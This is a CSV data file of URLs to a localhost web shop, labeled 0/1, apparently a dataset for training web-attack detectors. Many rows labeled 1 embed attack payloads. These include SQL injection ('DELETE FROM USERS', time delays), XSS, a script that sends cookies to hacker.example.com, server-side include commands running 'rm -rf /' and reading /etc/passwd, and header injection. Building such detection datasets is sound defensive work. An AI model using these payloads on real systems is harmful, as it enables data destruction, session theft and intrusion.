URL,Target
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/flash/java/javabean/FlashJavaBean.html,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=simzer&password=a26laN6a5O&nombre=Borna&apellidos=Ponce+Abad%EDa&email=inclan%40aprendeaestudiar.ec&dni=63019006H&direccion=Jose+Sanchez+Pescador+S%2FN%2C+9-A&ciudad=Coronada%2C+La&cp=3913A&provincia=Toledo&ntc=6649652935543559&B1=Registrar,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoAND+1%3D1,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/scripts/tools/dsnform.exe,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dovel&pwd=theresa&remember=offany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Entrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=linni&password=892444a9aci8&nombre=Rosario&apellidos=Bagudanc+Robles&email=haumann%40maxiwagen.tj&dni=72278943V&direccion=C%2F+Santa+Beatriz+104%2C+8D&ciudadA=Mingorr%EDa&cp=42173&provincia=Palencia&ntc=8723970834822268&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dadang&pwd=6a1er87&rememberA=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/msadc/samples/selector/showcode.asp,1
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=56&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=kuntova&pwd=TROvA&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1438&B1=Confirmar,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/imagenes/asf-logo-wide.gif/.OLD,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gaconnie%27INJECTED_PARAM&password=81v58O&nombre=Dimas&apellidos=I%F1igo+Abelli&email=carbonell%40adondeir.um&dni=83627503D&direccion=Calle+Gran+Plaza%2C+103%2C+13%3FH&ciudad=San+Carlos+del+Valle&cp=15211&provincia=Guip%FAzcoa&ntc=5505928898200135&B1=Registrar,1
http://localhost:8080/_cti_pvt/bots.cnf,1
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gosz%27czyn&pwd=725l479zo&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2408&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombreA=Vino+Rioja&precio=39&cantidad=72&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.Inc,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=991&B1=Confirmar,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schenck6&password=Veloc%EDPeDO&nombre=Rangle&apellidos=Santalo+Gabas&email=gelman_fildes%40qcole.et%2B&dni=20787549B&direccion=Lugar+Monta%F1a+Del+Palmital%2C+143%2C+8-E&ciudad=Maracena&cp=16855&provincia=Toledo&ntc=1669337364255501&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/databasenotes.html,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,1
http://localhost:8080/tienda1/asf-logo-wide.gif/.java,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4965&B1=Confirmar%2F,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=68&B1=A%F1adir+al+carrito%253F,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hatzenbi5&password=espa7t4ro&nombre=Canela&apellidos=Cutillas&email=spano-macary%40biosaludsystems.ml&dni=48940261X&direccion=Marcos+Redondo+151%2C+10%3FB&ciudad=Villarrasa&cp=06640&provincia=Soria&ntc=3291164782388110&B1=Registrar,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/miembros/imagenes.java,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=garner3&pwd=p%CDaMEnte&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=reiner&password=t0na5t44lA&nombre=Lucrecio&apellidos=Jado&email=siku%40tartasconamor.in&dni=67615328C&direccion=De+Las+Aguas%2C+196+&ciudad=Ca%F1ada+del+Hoyo&cp=37427&provincia=M%E1laga&ntc=7666460029738411&B1=Registrar,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/travelnet/home.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/~,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=63&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/global/estilos.css/,1
http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/,1
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=16&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=herbie&pwd=%253F&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=petruck&pwd=desnudez&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=36&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7201&B1=Confirmar,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=brunstin&pwd=decidir&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=armenta&password=villero&nombre=Rondel&apellidos=Avalos+Da+Silva&emailA=pavlis%40travelzone.vc&dni=84634236D&direccion=C%2F+Rio+Bidasoa%2C+199+&ciudad=Roca+de+la+Sierra%2C+La&cp=46910&provincia=Valladolid&ntc=1701163791515432&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7233any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Confirmar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=4459&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=calow&pwd=ensa%F1ada&remember=off%2F&B1=Entrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro%3F&login=fernan&password=pul%21que&nombre=Zulma&apellidos=Corena+Lax&email=perin-bouwmeester%4018horas.aq&dni=44517452D&direccion=Passatge+Tarragona%2C+161+4%3FF&ciudad=Urnieta&cp=31693&provincia=Barcelona&ntc=8995060519994325&B1=Registrar,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=87%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kapil&password=d1c36o4ca&nombre=Berina+del+Valle&apellidos=Artico&email=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sinoyann&password=abarcuzar&nombre=Wido&apellidos=Ballb%E9+Canudes&email=lora%40rocofer.jobs&dni=26562587W&direccion=Logro%F1o%2C+98%2C+5-D&ciudad=Venialbo&cp=46369&provincia=La+Rioja&ntc=0246690614310406&B1=Registrar,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=oplinger&password=3i49UICI%D3n&nombre=Zidanelia&apellidos=Linares+Barreras&email=henckels%40easyviaggio.tr&dni=38036492N&direccion=Calle+Juan+De+Juanes%2C+143+&ciudad=Miranda+de+Arga&cp=09311&provincia=Salamanca&ntc=0908272174397466&B1=Registrar,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=44&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5565&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/global.old,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=turus&pwd=e2toc8da&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=satkamp&password=6asc5oSo&nombre=N%E9lida&apellidos=%2B&email=hurst%40guejos.iq&dni=91086664V&direccion=Callejon+Cinco+Minutos%2C+31+6%3FD&ciudad=Sieteiglesias+de+Tormes&cp=40355&provincia=Vizcaya&ntc=5805357208824154&B1=Registrar,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lauro&password=57rsant2541&nombre=Iolaf&apellidos=Bogs+Terradas&email=anys%40ebuy.com.tr&dni=19109062H&direccion=C%2F+Guadiana+80+13-A&ciudad=Sarri%E0+de+Ter&cp=50490&provincia=Girona&ntc=1006455310670976&B1=Registrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=39&B1=A%F1adir+al+carrito,0
http://localhost:8080/patient/register.do,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4320&B1A=Pasar+por+caja,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=fitness&password=chap8n&nombre=Sol&apellidos=Masferr%E9+Massan%E9s&email=fechner_rabel%40fortelingenieria.sd&dni=85063049X&direccion=Can+Ferragut%2C+132%2C+4%3FE&ciudad=Rebolledo+de+la+Torre&cp=25727&provincia=Almer%EDa&ntc=6608191382152819&B1=Registrar,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/4861362529278789730,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/4861362529278789730,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=crickard&pwd=%27+DELETE+FROM+USERS&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hartmann&password=al55nza&nombre=Randolfo&apellidos=Rovirola+Noiran&email=lorre-d%40uell2%40simulacion-credito.ma&dni=73500117Y&direccion=Pl.+Aranjuez%2C+S%2FN+&ciudad=Sobremunt&cp=18127&provincia=Tarragona&ntc=1198702099336688&B1=Registrar,1
http://localhost:8080/tienda1/4861362529278789730,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=xiaojing&password=coNtRadiCha&nombre=Iara&apellidos=Noya+Driu&email=milton%40diagnosticoradiologico.asia&dni=97426856Y&direccion=C%2F+Fuente+Pista+De+Tenis%2C+164+&ciudad=Aliseda&cp=40560&provincia=Le%F3n&ntc=5798582876895008&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080.Old,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=manek&password=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&nombre=Oberto&apellidos=Mansur+Morales&email=laval_koldehoff%40nutrimama.sb&dni=73525509Y&direccion=Alarona%2C+52+&ciudad=San+Garc%EDa+de+Ingelmos&cp=26375&provincia=Soria&ntc=8551810827750150&B1=Registrar,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=surber&password=sacramentaci%F3n&nombre=Malinda&apellidos=T_orrent&email=byrnes%40nuestrasantacruz.um&dni=20918632V&direccion=C%2F+Del+Ingenio%2C+159+&ciudad=Alpicat&cp=13195&provincia=Teruel&ntc=3176719416679407&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=morten&password=sINCr5Nica&nombre=Solano&apellidos=Mera+Alc%E1cer&email=cambre%40be%F1esmer.na&dni=99783130E&direccion=Calle+Hostieros%2C+24+&ciudad=Brihuega&cp=50700&provincia=Cuenca&ntc=3581640568970302&B1=Registrar,0
http://localhost:8080/agentrunner.nsf,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=34&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=45&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1.bak,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/global/estilos.css~,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/statmail.nsf,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tiong-ho&password=an1l5m9no&nombre=Hadasa&apellidos=Subias&email=parada.biuchet4%40aulahost.gw&dni=79845869N&direccion=Jacinto+Benavente%2C+165+7F&ciudad=Herreruela&cp=11330&provincia=Teruel&ntc=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27INJECTED_PARAM,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=danzig&password=BibL7o718a24o&nombre=Mardoqueo&apellidos=Jaimes&emailA=coder%40enmenorca.com.tn&dni=30888361M&direccion=Calle+Rosa+De+Lima+S%2FN+4D&ciudad=Ulea&cp=09640&provincia=C%F3rdoba&ntc=2914128160766490&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Confirmar,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=eastreg&password=impla6ica1le&nombre=Carmen&apellidos=Gr%E0cia+Puigmart%ED&email=dufresne%40mauvier.hk&dni=51243773A&direccion=Calle+Perla%2C+71+&ciudad=Villalbilla&cp=45594&provincia=Le%F3n&ntc=7784731967679465&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=burdette&password=alm3donad6&nombre=Luciliano&apellidos=Maroto+Fancelli&email=voldstad3%40enlapalma.com.gy&dni=89061921X&direccion=C%2F+Rams%2C+70+11-F&ciudad=Hornillos+de+Cameros&cp=19119&provincia=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&ntc=2545576057068640&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alane&password=9u7Je&nombre=Ignolinda&apellidos=Motta&email=fargue-innis%40soycastellano.no&dni=04469375S&direccion=Calle+Melchor+Cobo+Medina%2C+16%2C+6H&ciudad=Andorra%27OR%27a%3D%27a&cp=09129&provincia=Girona&ntc=1134011255413195&B1=Registrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=edik3&pwd=a6mi9a2&remember=on%2F&B1=Entrar,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nerby5&password=te6b8anTe&nombre=Rosarito&apellidos=Millan+Guiral&email=goldsborough4%40sevach.name&dni=47183982B&direccion=C%2F+Jardins+Dels+Gegants+De+Gracia+143%2C+11-H&ciudad=Melgar+de+Abajo&cp=06228&provincia=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=9926995556034564&B1=Registrar,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%257C,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombreA=Queso+Manchego&precio=100&cantidad=52&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=90&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/4861362529278789730,1
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=89&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=iorgo&password=c0l0o4a&nombre=Mae&apellidos=Ben%EDtez+Monill&email=mouchet%40007tv.fj&dni=50159319E&direccion=Antonio+Toledano%2C+78%2C+10%3FH&ciudad=Roelos+de+Sayago&cp=49167&provincia=Le%F3n&ntc=1693717556836495&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
